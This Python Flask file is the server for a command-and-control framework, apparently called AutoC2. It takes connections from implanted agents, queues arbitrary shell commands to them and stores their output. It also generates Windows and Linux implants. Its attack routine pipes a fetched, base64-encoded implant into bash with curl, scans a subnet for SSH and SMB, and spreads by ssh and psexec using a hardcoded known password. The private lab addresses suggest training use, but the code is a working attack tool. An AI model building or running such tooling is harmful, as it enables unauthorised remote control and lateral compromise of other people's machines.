from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify
import os
import socket
import threading
import queue
import readline
import logging
from concurrent.futures import ThreadPoolExecutor

# Custom imports
import users
import implants
import attacks

# IP and port configs
SERVER_HOST = "192.168.108.15"
SERVER_PORT = 4444
FLASK_HOST = "192.168.108.15"
FLASK_PORT = 5000
TARGET_SUBNET = "192.168.108."

# C2 configs
DELAY = 10
JITTER = 2

# Known password
KNOWN_PW = "password"

# Flask stuff
app = Flask(__name__)
app.secret_key = "ac2_secret"
#log = logging.getLogger('werkzeug')
#log.disabled = True

# Set up server logging
logger = logging.getLogger(__name__)
if os.path.exists("server.log"):
    os.remove("server.log")
logging.basicConfig(filename='server.log', encoding='utf-8', format='%(asctime)s - %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p', level=logging.INFO)

# Keep track of registered agents
registered_addresses = set()
registered_agents_id = [None] # Lookup by id
registered_agents_ip = {} # Lookup by ip
curr_id = 1

class Agent:
    def __init__(self, id, ip, hostname, whoami):
        self.id = id
        self.ip = ip
        self.hostname = hostname
        self.command_queue = queue.Queue()
        self.curr_cmd_id = 1
        self.whoami = whoami

# Function to handle client connections
def handle_client(client_socket, client_address):
    if client_address[0] not in registered_addresses:
        try:
            # Get hostname
            command = "hostname; whoami" + "\n"
            logging.info(f"[+] New agent connected ({client_address[0]}). Gathering info...")
            client_socket.sendall(command.encode())

            # Receive output from the client until the delimiter
            buffer = b''
            while b'ac2delim' not in buffer:
                data = client_socket.recv(4096)
                if not data:
                    break  # Exit if client closes the connection
                buffer += data
            
            # Extract output
            output = buffer.partition(b'ac2delim')[0].decode()
            
            # Register the agent
            registered_addresses.add(client_address[0])
            global curr_id
            if output:
                split_output = output.split("\n")
                hostname = split_output[0].strip()
                whoami = split_output[1].strip()
            new_agent = Agent(curr_id, client_address[0], hostname, whoami)
            curr_id += 1
            registered_agents_id.append(new_agent)
            registered_agents_ip[client_address[0]] = new_agent
            logger.info(f"[+] Registered new agent {new_agent.hostname} ({new_agent.ip})")

        except Exception as e:
            logger.error(f"[!] Error with client {client_address}: {e}")
        finally:
            client_socket.close()
    else:
        try:
            agent = registered_agents_ip[client_address[0]]
            while True:
                # Check if there are commands in the queue for the agent
                if not agent.command_queue.empty():
                    # Get the next command from the queue
                    command = agent.command_queue.get()
                    logging.info(f"[+] Sending command to <{agent.hostname}> ({agent.ip}): {command}")
                    client_socket.sendall(command.encode())

                    # Receive output from the client until the delimiter
                    buffer = b''
                    while b'ac2delim' not in buffer:
                        data = client_socket.recv(4096)
                        if not data:
                            break  # Exit if client closes the connection
                        buffer += data
                    
                    # Extract and display the output up to the delimiter
                    output = buffer.partition(b'ac2delim')[0].decode()
                    
                    # Log output
                    if not os.path.exists("cmd_output"):
                        os.mkdir("cmd_output")
                    path = "cmd_output/" + f"agent{agent.id}-{agent.curr_cmd_id}.out"
                    with open(path, 'w') as file:
                        file.write(command)
                        file.write(f"Output:\n-------------------------------------------------------------------------------------\n")
                        file.write(output)

                    # Update cmd id
                    agent.curr_cmd_id += 1
                else:
                    break
        except Exception as e:
            logger.error(f"[!] Error with client {client_address}: {e}")
        finally:
            client_socket.close()

def start_server():
    # Set up server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen()

    logger.info("[+] AutoC2 Server starting")
    logger.info(f"[+] Listening for incoming connections on {SERVER_HOST}:{SERVER_PORT}...")

    try:
        while True:
            # Accept a new client
            client_socket, client_address = server_socket.accept()
            
            # Create a new thread to handle each client
            client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
            client_thread.daemon = True
            client_thread.start()
    except Exception as e:
        logger.info("\n[!] Shutting down the C2 server.")
    finally:
        server_socket.close()

def network_scan(subnet="192.168.108.", ports=[22, 445]):
    """
    Scans the given subnet for specified ports and handles results accordingly.

    Args:
        subnet (str): The subnet to scan, e.g., "192.168.108.".
        ports (list): List of ports to scan, e.g., [22, 445].
    """
    ssh_hosts = []
    smb_hosts = []
    def scan_host(ip):
        for port in ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)  # Timeout for connection
                    result = s.connect_ex((ip, port))
                    if result == 0:
                        if port == 22:
                            ssh_hosts.append(ip)
                            print(f"[INFO] SSH (port 22) open on {ip}. Potential SSH server.")
                        elif port == 445:
                            smb_hosts.append(ip)
                            print(f"[INFO] SMB (port 445) open on {ip}. Potential SMB service.")
                    else:
                        # print(f"[DEBUG] Port {port} closed on {ip}.")
                        pass
            except Exception as e:
                print(f"[ERROR] Error scanning {ip}:{port} - {e}")

    print("[INFO] Starting scan...")
    with ThreadPoolExecutor(max_workers=20) as executor:
        ips = [f"{subnet}{i}" for i in range(1, 255)]
        executor.map(scan_host, ips)
    print("[INFO] Scan completed.")

    return ssh_hosts, smb_hosts

def perform_attack():
    # Run implant code on host
    command = f"curl http://{FLASK_HOST}:{FLASK_PORT}/static/lin | base64 -d | bash &"
    os.system(command)

    ssh_hosts, smb_hosts = network_scan(TARGET_SUBNET)
    for host in ssh_hosts:
        print(f"Attempting ssh attack for {host}")
        attacks.ssh("root", KNOWN_PW, host, FLASK_HOST, FLASK_PORT)
    for host in smb_hosts:
        print(f"Attempting smb attack for {host}")
        attacks.psexec("Administrator", KNOWN_PW, host, FLASK_HOST, FLASK_PORT)
    

@app.route('/')
def home():
    if 'username' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if users.validate_user(username, password):
            session['username'] = username
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid username or password!', 'danger')
    return render_template('login.html')


@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        flash('Please log in first.', 'warning')
        return redirect(url_for('login'))
    return render_template('dashboard.html', username=session['username'], agents=registered_agents_id[1:])

@app.route('/attack')
def attack():
    if 'username' not in session:
        flash('Please log in first.', 'warning')
        return redirect(url_for('login'))
    return render_template('attack.html')

@app.route('/logs')
def logs():
    if 'username' not in session:
        flash('Please log in first.', 'warning')
        return redirect(url_for('login'))

    # Specify the path to your log file
    log_file_path = 'server.log'

    # Read the contents of the log file
    try:
        with open(log_file_path, 'r') as file:
            log_content = file.readlines()
    except FileNotFoundError:
        log_content = ["Log file not found."]

    # Render the log contents in the HTML template
    return render_template('logs.html', log_content=log_content)

@app.route('/start_attack', methods=['POST'])
def start_attack():
    # Call your Python function here
    perform_attack()
    return "Attack initiated successfully!"

@app.route('/logout')
def logout():
    session.pop('username', None)
    flash('You have been logged out!', 'info')
    return redirect(url_for('login'))

@app.route("/send_command", methods=["POST"])
def send_command():
    data = request.get_json()
    agent_id = int(data["agent_id"])
    command = data["command"]
    agent = registered_agents_id[agent_id]

    if agent:
        agent.command_queue.put(command + "\n")
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": "Invalid agent ID"}), 400

@app.route("/retrieve_output", methods=["POST"])
def retrieve_output():
    data = request.get_json()
    agent_id = int(data["agent_id"])
    cmd_id = int(data["cmd_id"])
    agent = registered_agents_id[agent_id]

    path = "cmd_output/" + f"agent{agent.id}-{cmd_id}.out"
    try:
        with open(path, 'r') as file:
            output_lines = file.readlines()
    except FileNotFoundError:
        output_lines = ["Output file not found."]

    output = "\n".join(output_lines)

    if agent:
        return jsonify({"success": True, "output": output})
    else:
        return jsonify({"success": False, "error": "Invalid agent ID"}), 400

if __name__ == '__main__':
    # Default creds
    if not os.path.exists("creds.db"):
        users.register("admin", "admin")

    # Prepare implants in static/
    ps = implants.win(SERVER_HOST, SERVER_PORT, DELAY, JITTER)
    with open("static/win.ps1", 'w') as file:
        file.write(ps)
    bash = implants.lin(SERVER_HOST, SERVER_PORT, DELAY, JITTER)
    with open("static/lin", 'w') as file:
        file.write(bash)

    # Run C2 Server in separate thread
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

    # Run Flask in main thread
    logger.info(f"[+] Starting Flask app on {FLASK_HOST}:{FLASK_PORT}")
    app.run(host=FLASK_HOST, port=FLASK_PORT)
